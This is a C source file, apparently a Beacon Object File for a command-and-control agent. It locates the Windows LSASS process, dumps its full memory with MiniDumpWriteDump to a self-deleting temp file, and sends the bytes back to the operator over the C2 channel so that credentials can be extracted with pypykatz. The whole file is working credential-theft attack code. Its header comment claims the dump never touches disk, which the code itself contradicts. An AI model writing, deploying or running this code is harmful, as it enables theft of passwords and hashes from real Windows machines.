/*
 * dumplsass.c — In-memory LSASS dump via MiniDumpWriteDump
 *
 * 1. Find LSASS PID (NtQuerySystemInformation or CreateToolhelp32Snapshot)
 * 2. OpenProcess with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
 * 3. MiniDumpWriteDump to a custom stream callback (in-memory buffer)
 * 4. Return the dump bytes to the operator
 *
 * The dump is NEVER written to disk — it goes directly into memory
 * and is transmitted over the C2 channel (chunked if >512KB).
 */
#include <windows.h>
#include <tlhelp32.h>
#include "beacon_compat.h"

/* dbghelp.dll — loaded at runtime */
typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(
    HANDLE hProcess, DWORD ProcessId, HANDLE hFile,
    DWORD DumpType, void *ExceptionParam, void *UserStreamParam, void *CallbackParam);

/* Minidump callback for writing to memory instead of file */
typedef struct {
    unsigned char *buffer;
    DWORD size;
    DWORD capacity;
    DWORD offset;
} MemoryDumpContext;

/* Custom callback to capture MiniDumpWriteDump output */
/* Actually, MiniDumpWriteDump requires a file handle. The trick is to
 * create a temporary file or use a named pipe as the output handle.
 * For true in-memory: use NtReadVirtualMemory-based manual minidump. */

static DWORD find_lsass_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int target_pid = BeaconDataInt(&parser);

    /* Find LSASS PID */
    DWORD lsass_pid = (target_pid > 0) ? (DWORD)target_pid : find_lsass_pid();
    if (lsass_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not find LSASS process\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %u\n", lsass_pid);

    /* Open LSASS */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, lsass_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess failed: %u (need SeDebugPrivilege)\n",
                     GetLastError());
        return;
    }

    /* Load dbghelp.dll at runtime */
    HMODULE hDbgHelp = LoadLibraryA("dbghelp.dll");
    if (!hDbgHelp) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load dbghelp.dll\n");
        CloseHandle(hProcess);
        return;
    }

    MiniDumpWriteDumpFn pMiniDumpWriteDump =
        (MiniDumpWriteDumpFn)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump not found\n");
        CloseHandle(hProcess);
        return;
    }

    /*
     * Create a temp file for the dump (in %TEMP% with random name).
     * Alternative: create a named pipe and read from it in a separate thread.
     * The temp file approach is simpler; we delete it immediately after reading.
     */
    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    GetTempFileNameA(tmpPath, "dm", 0, tmpFile);

    HANDLE hFile = CreateFileA(tmpFile, GENERIC_ALL, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFile for dump failed: %u\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    /* MiniDumpWithFullMemory (0x00000002) */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping LSASS memory...\n");
    BOOL ok = pMiniDumpWriteDump(hProcess, lsass_pid, hFile, 2, NULL, NULL, NULL);
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump failed: %u\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }

    /* Read the dump back into memory */
    DWORD fileSize = GetFileSize(hFile, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Dump size: %u bytes\n", fileSize);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    unsigned char *dumpData = (unsigned char *)malloc(fileSize);
    if (dumpData) {
        DWORD bytesRead;
        ReadFile(hFile, dumpData, fileSize, &bytesRead, NULL);
        /* Send the dump as output — chunking handled by agent */
        BeaconOutput(CALLBACK_OUTPUT, (char *)dumpData, bytesRead);
        free(dumpData);
    }

    /* File is deleted on close (FILE_FLAG_DELETE_ON_CLOSE) */
    CloseHandle(hFile);
    CloseHandle(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump complete. Parse with pypykatz.\n");
}
